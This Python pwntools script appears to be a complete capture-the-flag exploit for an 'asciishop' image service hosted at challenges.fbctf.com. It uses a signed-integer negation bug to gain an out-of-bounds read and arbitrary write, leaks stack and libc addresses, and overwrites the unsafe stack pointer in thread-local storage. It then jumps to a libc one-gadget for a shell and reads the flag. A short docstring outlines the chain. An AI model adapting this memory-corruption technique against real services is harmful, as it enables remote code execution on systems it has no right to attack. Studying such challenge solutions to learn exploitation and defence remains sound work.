from pwn import *
from time import time

context.bits = 64
context.terminal = ['tmux', 'split-window', '-h']
context.buffer_size = 65536


p = None

def upload_image(name, width, height, offset, ascii):
    p.readuntil(">>> ")
    p.sendline("1")
    p.readuntil("Ascii id: ")

    p.sendline(name)
    p.readuntil("Upload ascii\n")

    header = 'ASCI' + p32(width) + p32(height) + p32(offset)
    header_length = len(header);

    ascii_length = len(ascii)

    img = header + ascii.ljust((0x410 - header_length), '\0')
    assert(len(img) == 0x410)
    p.send(img)


def download_image(name):
    p.readuntil(">>> ")
    p.sendline("2")

    p.readuntil("Ascii id: ")
    p.sendline(name)

    data = p.readuntil("<<<EOF\n")

    data = data[:data.find('<<<EOF')]

    return data


def delete_image(name):
    p.readuntil(">>> ")
    p.sendline("3")

    p.readuntil("Ascii id: ")
    p.sendline(name)



def set_byte(name, x, y, c):
    fmt = "(%s, %s) %s"
    p.readuntil(">>> ")
    p.sendline("4")

    p.readuntil(">>> ")
    p.sendline("1")

    p.readuntil("Ascii id: ")
    p.sendline(name)

    p.readuntil(">>> ")
    p.sendline("1")

    p.readuntil("pixel: ")
    p.sendline(fmt % (x, y, c))

def backout_set_byte():
    p.readuntil(">>> ")
    p.sendline("4")

    p.readuntil(">>> ")
    p.sendline("4")



def fill_pools(npools):
    n = npools * 4
    names = cyclic(n)
    for i in xrange(4, n + 4, 4):
        name = names[i - 4: i]
        upload_image(name, 1, 1, 0, name)

def backout_set_byte():
    p.readuntil(">>> ")
    p.sendline("4")
    p.readuntil(">>> ")
    p.sendline("4")


def overwrite_next_height():
    # New Dimensions
    # Width: 32
    # Height: 1023
    # 0x410
    set_byte('a', 520, 520, '\xff')
    set_byte('a', 520, 521, '\x03')

    backout_set_byte()


def probe_oob_read(index):
    fill_pools(14)

    probes = list(string.ascii_letters)

    upload_image(probes[index], 1, 1, 0x80000000, "A"*200)
    upload_image(probes[index + 26], 17, 32, 0, "B"*200)

    set_byte(probes[index], 520, 520, '\xff')
    set_byte(probes[index], 520, 521, '\x03')

    backout_set_byte()

    data = download_image(probes[index + 26])

    return probes[index], probes[index + 26], data


TLS_STAMP = 0x9691a75

def search_for_tls_stamp(data):
    prev = None
    for i in xrange(8, len(data) + 8, 8):
        qword = u64(data[i-8:i])
        if qword == TLS_STAMP and (prev & 0xfff) == 0x8e9:
            return (i - 8)

        prev = qword

    return False

def find_thread_local_storage():
    for i in range(16):
        first, second, data = probe_oob_read(i)

        stamp_index = search_for_tls_stamp(data)
        if stamp_index:
            backout_set_byte()
            return first, second, data, stamp_index

    backout_set_byte()
    return None, None, None, None

def set_unsafe_stack(second, safe_stack, offset):
    #9144
    #17936
    #18768
    index = offset // 2
    ss = p64(safe_stack)

    for i in xrange(8):
        set_byte(second, index , index + i , ss[i])

def destroy_safe_stack(retaddr, start):
    p.readuntil(">>> ")
    p.sendline("4")

    p.readuntil(">>> ")
    p.sendline("2")

    p.readuntil("Ascii id: ")
    p.sendline("a")

    p.readuntil("Upload filter\n")

    offset = start
    offset += 8

    payload = cyclic(start) + p64(retaddr) + ('\x00'*(1024 - offset))
    assert(len(payload) == 1024)
    p.send(payload)

"""
Exploitation

Set offset to -2147483648 this bypasses the validation
X = -2147483648
X = -X
X == -2147483648

This is an arbitrary write within the process space.

Use the arbitrary write to set the dimensions of an image and leak
the safe stack and an address in the executable

Use the arbitrary write to overwrite the unsafe stack pointer in the
Thread Local Storage, allowing for arbitrary write on the next read
into a stack buffer

Call add a filter to the image, which reads 1024 bytes into the
overwritten unsafe stack pointer
"""

def exploit(start):
    global p

    def go(aslr=False):
      global p

      p = process("./asciishop", aslr=True, env={})
      if (not aslr):
        gdb.attach(p, gdbscript='''
          c
        ''')
      else:
        gdb.attach(p, gdbscript='''
          #break *0x0000000000412d0f
          #break *0x0000000000412b8f
          #break *0x00000000004132bc
          #break *0x0000000000412b1f
          c
        ''')
      return

    #go(True)
    #p = process("./asciishop", aslr=True, env={})
    #p = remote("172.17.0.3", 2301)
    p = remote("challenges.fbctf.com", 1340)

    first, second, data, index  = find_thread_local_storage()

    stack_leak_offset = index + 6112
    #print(stack_leak_offset)
    safe_stack_leak = u64(data[stack_leak_offset:stack_leak_offset+8])

    libc_leak_offset = index + 720
    libc_leak = u64(data[libc_leak_offset:libc_leak_offset+8])
    libc_base = libc_leak - 96179

    #print("SAFE STACK LEAK: " + hex(safe_stack_leak))
    #print("LIBC_LEAK: " + hex(libc_leak))
    #print("LIBC_BASE: " + hex(libc_base))

    magic_gadget = libc_base + 0x4f322
    delete_image(second)
    upload_image(second, 1, 1, 0x80000000, "Q"*200)
    set_unsafe_stack(second, safe_stack_leak, stack_leak_offset - 1696)
    destroy_safe_stack(magic_gadget, start)  # magic gadget

    p.sendline("cat /home/asciishop/flag")
    print(p.readline("\n"))
    print(p.readline("\n"))
    print(p.readline("\n"))

if __name__ == "__main__":
    for i in xrange(440, 1024, 4):
        try:
            print("Index: " + str(i))
            exploit(i)
        except:
            pass
